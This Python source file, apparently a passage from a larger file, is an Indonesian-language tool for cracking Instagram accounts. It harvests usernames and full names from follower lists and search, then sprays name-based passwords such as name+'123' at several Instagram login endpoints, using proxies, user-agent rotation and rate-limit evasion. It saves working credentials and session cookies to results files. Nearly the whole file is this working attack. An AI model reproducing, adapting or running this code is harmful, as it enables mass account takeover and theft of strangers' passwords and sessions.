         elif ask in["07","7"]:warna = "[#00FFFF]";teks="cyan"
         elif ask in["08","8"]:warna = "[#FFFFFF]";teks="putih"
         elif ask in["09","9"]:warna = "[#FF8F00]";teks="orange"
         elif ask in["10"]:warna = "[#AAAAAA]";teks="abu-abu"
         open("assets/theme_color","w").write(warna+"|"+warna.replace("[","").replace("]",""))
         prints(Panel(f"""{H2}Berhasil Mengganti Tema Ke {teks}, Silahkan Jalankan Ulang Tools Nya""",width=80,padding=(0,6),style=f"{color_table}"))
         sys.exit()

    def checkHasil(self):
        prints(Panel(f"{P2}Tunggu Sebentar Sedang Mengecek File Hasil Result Anda",width=80,padding=(0,9),style=f"{color_table}"))
        time.sleep(4)
        for i in os.listdir('results'):
            print(f' {H}•{N} {i}')
            c=input(f' {H}•{N} Masukan Nama File : {H}')
            g=open("results/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'\n {H}•{N} Total Result Di Temukan : {H}{len(g)}{N}')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="CP":
                  print(f"""
{P}[{K}+{P}] {K}COBALAGI{P}
 {P}|{P}
 {P}├╴>{P} username  : {K}{usr}{P}
 {P}├╴>{P} password  : {K}{pwd}{P}
 {P}├╴>{P} followers : {K}{fol}{P}
 {P}├╴>{P} following : {K}{ful}{P}
					""");time.sleep(0.05)
                else:
                    print(f"""
{N}[{H}+{N}] {H}OK(SELAMAT){N}
 {N}|{N}
 {N}├╴>{N} username  : {H}{usr}{N}
 {N}├╴>{N} password  : {H}{pwd}{N}
 {N}├╴>{N} followers : {H}{fol}{N}
 {N}├╴>{N} following : {H}{ful}{N}
					""");time.sleep(0.05)
    
    def SettingUgent(self):
        ask = input(f" {H}•{N} Apakah Ingin Mengganti Useragent? (Y/t) :{H} ")
        prints(Panel(f"{P2}Masukan Useragent Handphone Anda, Masuk Ke Chrome Ketik My User Agent",width=80,padding=(0,3),style=f"{color_table}"))
        if ask in ask:
           uadarimu.append('uadia')
           xc = input(f" {H}•{N} Masukan Useragent : {H}");self.loadUgents(Instagram)
           uadia.append(xc)
           prints(Panel(f"{N2}{xc}",title=f"{H2}Berhasil Mengganti Useragent",style=f"{color_table}"))
           open("data/UserAgent.txt", "w").write(xc)
        else:
           uadarimu.append('ugentku')
    
    def getUserAgent(self):
        try:
            with requests.Session() as ses:
                 url_iphone = ses.get("https://pastebin.com/raw/qdWeBgZc").text
                 url_huawei = ses.get("https://pastebin.com/raw/yZ7yeCtU").text
                 url_samsung = ses.get("https://pastebin.com/raw/0GuHZRhL").text
                 url_redmi = ses.get("https://pastebin.com/raw/sR4ShZHG").text
                 prints(Panel(f"{N2}{url_iphone}",title=f"{H2}01{P2}",style=f"{color_table}"))
                 prints(Panel(f"{N2}{url_huawei}",title=f"{H2}02{P2}",style=f"{color_table}"))
                 prints(Panel(f"{N2}{url_samsung}",title=f"{H2}03{P2}",style=f"{color_table}"))
                 prints(Panel(f"{N2}{url_redmi}",title=f"{H2}04{P2}",style=f"{color_table}"))
                 ugs = input(f" {H}•{N} Pilih Useragent : {H}")
                 open("data/UserAgent.txt", "w").write(ugs)
                 ugen = open("data/UserAgent.txt", "r").read()
                 print(f" {H}•{N} Sukses Ganti User Agent...");time.sleep(3);self.menu()
        except requests.exceptions.ConnectionError:
            print(f" {H}•{N} {M}Koneksi Internet Anda Bermasalah")
            time.sleep(3);exit()
    
    def joinGrup(self):
        try:
            os.system("xdg-open https://chat.whatsapp.com/LZRoMF1KR0GFKqYFCfnALC")
            time.sleep(2);exit()
        except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
            print(f" {H}•{N} {M}Koneksi Internet Anda Bermasalah")
            time.sleep(3);exit() 
    
    def search(self, link):
        try:
            xxx = self.ses.get(link, headers={"user-agent":self.ua_ig()}).json()
            for a in xxx["users"]:
                x = a["user"]
                self.id.append(x["username"]+"|"+x["full_name"])
                sys.stdout.write(f"\r {O}<>{P} Prosea Mengumpulkan {O}{len(self.id)}{N} Username");sys.stdout.flush()
        except:pass

    def dump(self, uid, cok, xnx, kos):
        try:
            xxx = self.ses.get(f"https://i.instagram.com/api/v1/friendships/{uid}/{xnx}/?count=100&max_id={kos}", headers={"user-agent":self.ua_ig()}, cookies={"cookie": cok})
            for x in json.loads(xxx.text)["users"]:
                if x["username"] in self.id:
                    continue
                self.id.append(x["username"]+"|"+x["full_name"])
                sys.stdout.write(f"\r {O}<>{P} Proses Mengumpulkan {O}{len(self.id)}{N} Username");sys.stdout.flush()
            if "next_max_id" in json.loads(xxx.text):self.dump(uid, cok, xnx, json.loads(xxx.text)["next_max_id"])
        except:pass

    def metode(self):
        urut = []
        urut.append(Panel(f"{P2}Methode Api   {H2}Onn{P2}",title=f"{H2} 1 {P2}",width=25,padding=(0,4),style=f"{color_table}"))
        urut.append(Panel(f"{P2}Methode Ajax {H2}Off{P2}",title=f"{H2} 2 {P2}",width=25,padding=(0,4),style=f"{color_table}"))
        urut.append(Panel(f"{P2}Methode Api V2 {H2}Off",title=f"{H2} 3 {P2}",width=27,padding=(0,6),style=f"{color_table}"))
        console.print(Columns(urut))
        kons = input(f" {O}•{N} Pilih Methode : {O}")
        if kons in ["A","1"]:
          method.append('satu')
        elif kons in ["B","2"]:
            method.append('dua')
        elif kons in ["C","3"]:
            method.append('tiga')
        else:
            method.append('satu')
    
    def tampung(self):
        try:
            prints(Panel(f"{P2}Results Akun Hasil {H2}OK{P2} Tersimpan Di : {H2}{akunOK}{P2}\nResults Akun Hasil {N2}CP{P2} Tersimpan Di : {N2}{akunCP}{P2}",width=80,padding=(0,8),style=f"{color_table}"))
        except:
            pass
    
    def mulai(self):
        print("\r")
        print(f" {O}•{N} Total Username Yang berhasil Terkumpul {O}{len(self.id)}{N}")
        self.metode()
        prints(Panel(f"{P2}[ {H2}Semoga Tai ya Bre>_ {P2}]",width=80,padding=(0,21),style=f"{color_table}"))
        self.tampung()
        prints(Panel(f"{P2}Hidupkan Mode Pesawat Ketika Kena {color_rich}Spam/Error{P2}",width=80,padding=(0,11),style=f"{color_table}"))
        progRich = str(random.choice(["clock","earth","monkey","moon"]))
        global prog,des
        prog = Progress(SpinnerColumn(f'{progRich}'),TextColumn('{task.description}'))
        des = prog.add_task('', total=len(self.id))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.id:
                    usez = user.split("|")[0]
                    nama = user.split("|")[1].lower()
                    for pasw in nama.split(" "):
                        if len(pasw)==3 or len(pasw)==4 or len(pasw)==5:
                           sandi = [pasw, pasw+"123", pasw+"1234", pasw+"12345", pasw.lower()]
                        else:
                           sandi = [pasw, pasw+"123", pasw+"1234", pasw+"12345", pasw.lower()]
                        if 'satu' in method:
                           bool.submit(self.Ngocok, usez, sandi)
                        elif 'dua' in method:
                           bool.submit(self.crackXC, usez, sandi)
                        elif 'tiga' in method:
                           bool.submit(self.crakersAPI, usez, sandi)
                        else:
                           bool.submit(self.Ngocok, usez, sandi)
            print("\r")
            prints(Panel(f" {P2}ig {color_rich}{len(self.id)} {P2}Username Selesai Hasil OK : {H2}{len(self.ok)}{P2} Hasil CP : {N2}{len(self.cp)}{P2} ",width=80,padding=(0,8),style=f"{color_table}"))
            time.sleep(3);exit()

    def UgentsLite(self):
        self.a = str(random.choice([
            'SM-J120F',
            'SM-A716U1']))
        self.b = str(random.randrange(73, 99))
        self.c = str(random.randrange(4200, 4900))
        self.d = str(random.randrange(40, 150))
        useragent = f''''''
        return useragent
    
    def ingponich(self, cok):
        try:
              link  = self.ses.get('https://www.instagram.com/api/v1/accounts/edit/web_form_data/', cookies={"cookie":cok}, headers={"user-agent":self.ua_ig()}).json()["form_data"]
              nomor = link["phone_number"].replace("-", "").replace(" ", "")
              tggl = link["birthday"]
              year, month, day = tggl.split("-")
              month = bulan_ttl[month]
              tanggal = (f"{day} {month} {year}")
        except (requests.exceptions.JSONDecodeError,KeyError):
              nomor = '-'
              tanggal_lahir = '-'
        return nomor, tanggal_lahir

    def Ingfo(self, xx):
        try:
            xnxx = self.ses.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={xx}", headers={"user-agent":self.ua_ig(),"x-ig-app-id":'936619743392459'})
            link = xnxx.json()["data"]["user"]
            nama = link["full_name"]
            peng = link["edge_followed_by"]["count"]
            meng = link["edge_follow"]["count"]
            post = link["edge_owner_to_timeline_media"]["count"]
        except:
            peng = "-"
            meng = "-"
            post = "-"
        return peng, meng, post

    def crakersAPI(self, user, pasw):
        prog.update(des,description=f"[{H2} lite.instagram.com {P2}] ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
              try:
                    with requests.Session() as ses:
                         uaz = self.UgentsLite()
                         uklik = str(random.choice(ugentku))
                         proxy = {'http': 'socks5://'+random.choice(prox)}
                         tokenKU = ses.get('https://z-p42.www.instagram.com/accounts/login/')
                         times = calendar.timegm(current_GMT)
                         headers = {
                             "Host": "z-p42.www.instagram.com",
                             "Connection": "keep-alive",
                             "Content-Length": "312",
                             "X-IG-WWW-Claim": "0",
                             "X-Instagram-AJAX": "9080db6b6a51",
                             "Content-Type": "application/x-www-form-urlencoded",
                             "Accept": "*/*",
                             "X-Requested-With": "XMLHttpRequest",
                             "X-ASBD-ID": "198387",
                             "User-Agent": uaz,
                             "X-CSRFToken": tokenKU.cookies['csrftoken'],
                             "X-IG-App-ID": "1217981644879628",
                             "Origin": "https://z-p42.www.instagram.com",
                             "Sec-Fetch-Site": "same-origin",
                             "Sec-Fetch-Mode": "cors",
                             "Sec-Fetch-Dest": "empty",
                             "Referer": "https://z-p42.www.instagram.com/",
                             "Accept-Encoding": "gzip, deflate",
                             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                         }
                         data = {
                             "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{times}:{password}",
                             "username":user,
                             "queryParams":"{}",
                             "optIntoOneTap":"false",
                             "stopDeletionNonce":"",
                             "trustedDeviceRecords":"{}"
                         }
                         xnxx = ses.post("https://z-p42.www.instagram.com/accounts/login/ajax/", headers = headers, data = data, proxies = proxy, allow_redirects = True)
                         if "logged_in_user" in str(xnxx.text) or "sessionid" in ses.cookies.get_dict() or "userId" in str(xnxx.text):
                              cokis = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
                              pengikut, mengikut, postingan = self.Ingfo(user)
                              print("\r                                       ")
                              adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {uklik}\nCookie    : {cokis}'
                              pepekXD = Panel(adit, style=f'#00FFFF')
                              print('\n')
                              os.popen('play-audio ok.mp3')
                              prints(Panel(pepekXD,style='',title=f'\r{H2}ig'))
                              kntl = (f"[✓] {user}|{password}|{pengikut}|{mengikut}|{postingan}")
                              self.ok.append(kntl)
                              with open("results/"+akunOK,"a", encoding="utf-8") as r:
                                   r.write(kntl+"\n")
                              break
                         elif "https://z-p42.www.instagram.com/challenge" in str(xnxx.text):
                              pengikut,mengikut,postingan=self.Ingfo(user)
                              print("\r                                       ")
                              adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {uklik}'
                              pepekXD = Panel(adit, style=f'#FFFF00')
                              print('\n')
                              os.popen('play-audio cp.mp3')
                              prints(Panel(pepekXD,style='',title=f'\r{N2}ig'))
                              self.ok.append(kntl)
                              with open("results/"+akunOK,"a", encoding="utf-8") as r:
                                   r.write(kntl+"\n")
                              break
                         elif "Please wait a few minutes before you try again." in xnxx.json() or "Harap tunggu beberapa menit sebelum mencoba lagi." in xnxx.json() or 'ip_block' in xnxx.text:
                              prog.update(des,description=f"[{M2} ig {P2}] ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")
                              time.sleep(15)
                              self.crakersAPI(self, user, pasw)
              except requests.exceptions.ConnectionError:
                   prog.update(des,description=f"[{M2} ig {P2}] ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")
                   time.sleep(31)
                   self.crakersAPI(self, user, pasw)
        self.lo+=1
    
    def crackXC(self, user, pasw):
        prog.update(des,description=f"[{H2} ig {P2}] ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
              try:
                    with requests.Session() as ses:
                         ua = str(random.choice(ugentku))
                         get_token = ses.get('https://www.secure.instagram.com/accounts/login/?force_classic_login&hl=en')
                         android = "android-%s"%hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
                         times = calendar.timegm(current_GMT)
                         headers = {
                             "Host": "www.secure.instagram.com",
                             "Connection": "keep-alive",
                             "Content-Length": "318",
                             "X-IG-WWW-Claim": "0",
                             "X-Instagram-AJAX": "9080db6b6a51",
                             "Content-Type": "application/x-www-form-urlencoded",
                             "Accept": "*/*",
                             "X-Requested-With": "XMLHttpRequest",
                             "X-ASBD-ID": "198387$",
                             "User-Agent": ua,
                             "X-CSRFToken": get_token.cookies['csrftoken'],
                             "X-IG-App-ID": "1217981644879628",
                             "Origin": "https://www.secure.instagram.com",
                             "Sec-Fetch-Site": "same-origin",
                             "Sec-Fetch-Mode": "cors",
                             "Sec-Fetch-Dest": "empty",
                             "Referer": "https://www.secure.instagram.com/accounts/login/",
                             "Accept-Encoding": "gzip, deflate",
                             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                         }
                         data = {
                             "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{times}:{password}",
                             "username":user,
                             "queryParams":"{}",
                             "optIntoOneTap":"false",
                             "stopDeletionNonce":"",
                             "trustedDeviceRecords":"{}"
                         }
                         xnxx = ses.post("https://www.secure.instagram.com/accounts/login/ajax/", headers = headers, data = data, allow_redirects = True)
                         if "logged_in_user" in str(xnxx.text) or "sessionid" in ses.cookies.get_dict() or "userId" in str(xnxx.text):
                              cokis = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
                              pengikut, mengikut, postingan = self.Ingfo(user)
                              print("\r                                       ")
                              adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {ua}\nCookie    : {cokis}'
                              pepekXD = Panel(adit, style=f'#00FFFF')
                              print('\n')
                              os.popen('play-audio ok.mp3')
                              prints(Panel(pepekXD,style='',title=f'\r{H2}ig'))
                              kntl = (f"[✓] {user}|{password}|{pengikut}|{mengikut}|{postingan}")
                              self.ok.append(kntl)
                              with open("results/"+akunOK,"a", encoding="utf-8") as r:
                                   r.write(kntl+"\n")
                              break
                         elif "https://www.secure.instagram.com/challenge" in str(xnxx.text):
                              pengikut,mengikut,postingan=self.Ingfo(user)
                              print("\r                                       ")
                              adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {ua}'
                              pepekXD = Panel(adit, style=f'#FFFF00')
                              print('\n')
                              os.popen('play-audio cp.mp3')
                              prints(Panel(pepekXD,style='',title=f'\r{N2}ig'))
                              self.ok.append(kntl)
                              with open("results/"+akunOK,"a", encoding="utf-8") as r:
                                   r.write(kntl+"\n")
                              break
                         elif "Please wait a few minutes before you try again." in xnxx.json() or "Harap tunggu beberapa menit sebelum mencoba lagi." in xnxx.json() or 'ip_block' in xnxx.text:
                              prog.update(des,description=f"[{M2} ig {P2}] ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")
                              time.sleep(15)
                              self.crackXC(self, user, pasw)
              except requests.exceptions.ConnectionError:
                   prog.update(des,description=f"[{M2} ig {P2}] ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")
                   time.sleep(31)
                   self.crackXC(self, user, pasw)
        self.lo+=1

    def Ngocok(self, user, pasw):
        ses=requests.Session()
        logtemp=0
        if logtemp > 10:
            logtemp=0
        guid = str(uuid.uuid4())
        ponid=str(uuid.uuid4())
        andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
        ig_sig=iyh["ig_sig"]
        uas=self.ua_Cok()
        dat=iyh["sinkz"]
        dat.update({"id": guid})
        data1=json.dumps(dat)
        ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
        data2=iyh["sinkz1"]
        data2.update({'signed_body': f'{ned}.{str(data1)}'})
        head=iyh["headaing"]
        head.update({"user-agent": uas})
        while True:
            try:
                p=ses.post(iyh["sinkz2"], headers=head, data=data2)
                break
            except:pass
        prog.update(des,description=f"ig ( {H2}aman{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
            try:
                data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password":password,"login_attempt_count": str(logtemp)})
                ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
                head2=iyh["headaing1"]
                head2.update({"user-agent": uas})
                sianjing=iyh["sianjing"]
                setan=sianjing.split("||")
                dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{password}{setan[7]}{logtemp}{setan[8]}'
                respon=ses.post(iyh["crack"],headers=head2,data=dataa)
                try:
                    kontol=json.loads(respon.text)
                except:
                    kontol=respon.text
                logtemp+=1
                if "logged_in_user" in str(kontol) or "sessionid" in ses.cookies.get_dict() or "userId" in str(kontol):
                    pengikut,mengikut,postingan=self.Ingfo(user)
                    print("\r                                       ")
                    adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}'
                    pepekXD = Panel(adit, style=f'#00FFFF')
                    os.popen('play-audio ok.mp3')
                    print('\n')
                    prints(Panel(pepekXD,style='',title=f'\r{H2}ig'))
                    kntl = (f"[✓] {user}|{password}|{pengikut}|{mengikut}|{postingan}")
                    self.ok.append(kntl)
                    with open("results/"+akunOK,"a", encoding="utf-8") as r:
                         r.write(kntl+"\n")
                    break
                elif "https://i.instagram.com/challenge" in str(respon.text):
                    pengikut,mengikut,postingan=self.Ingfo(user)
                    print("\r                                       ")
                    adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}'
                    pepekXD = Panel(adit, style=f'#FFFF00')
                    print('\n')
                    os.popen('play-audio cp.mp3')
                    prints(Panel(pepekXD,style='',title=f'\r{N2}ig'))
                    kntl = (f"[X️] {user}|{password}|{pengikut}|{mengikut}|{postingan}")
                    self.cp.append(kntl)
                    with open("results/"+akunCP,"a", encoding="utf-8") as r:
                         r.write(kntl+"\n")
                    break
                elif "ip_block" in str(respon.text) or "spam" in str(respon.text):
                    prog.update(des,description=f"ig ( {N2}Error{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")
                    time.sleep(15)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"ig ( {M2}Connect {P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")
                prog.advance(des)
                time.sleep(31)
            #except Exception as e:prints(e)
        self.lo+=1

### Ini Logo ( Lo Goblok )
def logoku():
    prints(Panel(f"""\t{P2}╔╗──╔══╦═══╦═══╦═╗─╔╦═══╦══╗
\t║║──╚╣╠╣╔═╗║╔══╣║╚╗║║╔═╗╠╣╠╝
\t║║───║║║╚══╣╚══╣╔╗╚╝║╚══╗║║
\t║║─╔╗║║╚══╗║╔══╣║╚╗║╠══╗║║║
\t║╚═╝╠╣╠╣╚═╝║╚══╣║─║║║╚═╝╠╣╠╗
\t╚═══╩══╩═══╩═══╩╝─╚═╩═══╩══╝""",title="Selamat Datang",width=80,padding=(0,4),style=f"{color_table}"))
                                             
if __name__=='__main__':
  try:os.system("git pull") 
  except:pass
  try:os.system('pkg install play-audio')
  except:pass
  try: Instagram()
  except requests.exceptions.ConnectionError:
     print(f" {H}•{N} koneksi internet anda bermasalah")
     time.sleep(3);exit() 
     


